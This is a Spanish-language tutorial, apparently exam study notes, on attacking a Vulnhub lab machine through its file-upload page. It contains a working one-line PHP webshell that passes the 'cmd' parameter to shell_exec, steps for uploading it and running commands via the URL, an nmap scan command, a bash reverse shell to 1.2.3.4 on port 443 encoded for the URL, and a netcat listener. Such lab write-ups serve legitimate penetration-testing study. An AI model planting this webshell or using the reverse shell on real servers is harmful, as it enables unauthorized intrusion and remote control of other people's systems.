
---
- TAG: #Intrusión #Servidor #Webshell
----
# Concepto y Práctica de una Webshell

En este bloc, vamos a aprender el concepto de una **Webshell** y ponerlo en práctica. Es una alternativa a los payloads creados con `.php`, similar a los generados con `msfvenom` para crear archivos maliciosos en `.php`.

La **Webshell** nos permite subir archivos maliciosos al servidor y, una vez accedamos a él, podamos ejecutar comandos de forma remota.

Vamos a explicar cómo se realizaría:

Para esto, vamos a necesitar:
1. Una máquina **Kali Linux**.
2. Máquina vulnerable de **Vulnhub** [Máquina SECTALKS: BNE0X03 - SIMPLE](https://www.vulnhub.com/entry/sectalks-bne0x03-simple%2C141/).

Una vez iniciada, vamos a nuestra máquina **Kali Linux** y realizamos el procedimiento correcto:
1. `arp-scan` para localizar la máquina víctima.
2. `ping` para ver el tipo de TTL y ver a qué nos enfrentamos.
3. `nmap` para encontrar vulnerabilidades y puertos abiertos:
   ```bash
   nmap -p- -sS -sC -sV --open --min-rate=5000 -n -Pn -vvv 1.2.3.4 -oN escaneo
   ```

Como ya habíamos trabajado con esta máquina, vamos directo a la explicación de la **Webshell**. Como mencionamos anteriormente, tenemos abierto el puerto 80 con una página web en el navegador que nos permite subir archivos.

Como habíamos probado subir archivos `.php` utilizando la herramienta `msfvenom`, vamos a probar una alternativa en caso de que nos refleje algún error al intentar usar `msfvenom` para la creación de payload.

1. Empezamos creando el archivo `.php`:
   ```bash
   nano webshell.php
   ```

   Dentro del archivo peguen lo siguiente, ya que en el examen no habrá internet y tendremos que tener estos apuntes:

   ```php
   <?php
       echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   ?>
   ```

   Salimos y guardamos.

2. Nos dirigimos al navegador y subimos el archivo recién creado.
3. En blocs anteriores hemos visto que teníamos la ruta `192.168.0.47/uploads`. Accedemos a ella y veremos que aparece nuestro archivo correctamente subido, pero al hacer click se queda en blanco.
4. Editamos la **URL** para obtener la intrusión. Al final del todo debe empezar con el signo `?`:
   ```bash
   192.168.0.47/uploads/avatar_kali_webshell.php?cmd=whoami
   ```

Veremos por respuesta `www-data` dentro del navegador, es decir, que hemos conseguido el acceso correctamente.

Pero en este punto no nos otorga una revershell como lo hacía `msfvenom`. Aquí estaremos consiguiendo ejecución remota de comandos. Si queremos intrusión a la máquina, lo que hay que hacer es insertar el comando propio de la **Revershell** pero **URLCodeada**, porque estamos insertando comandos dentro de la **URL** del navegador.

La mejor herramienta para **URLCodear** un comando es **Burpsuite**.

En el apartado de **Decoder**, verificamos nuestra dirección IP y le configuramos al comando de la revershell. Les recomiendo hacerlo así para evitar muchos problemas:

```bash
bash -c "bash -i >& /dev/tcp/1.2.3.4/443 0>&1"
```

En la opción `Encode as...` a su lado derecho, seleccionen `URL`.

Copiamos el resultado URL codeado.

Vamos a la terminal y nos ponemos en escucha por el puerto **443**:

```bash
nc -nlvp 443
```

Regresamos al navegador web y, después del `=` donde ejecutamos comandos como `whoami` o `ls`, borramos y pegamos la URL codeada.

![URL Encoded](url.png)

Una vez ejecutado este comando en la **URL**, tendremos acceso remoto a nuestra terminal por netcat por el puerto en escucha **443**.

Esta sería la otra opción en caso de que presenten problemas con la herramienta de `msfvenom`.

Con esta opción tampoco perderán la conexión como lo hacíamos con `msfvenom`.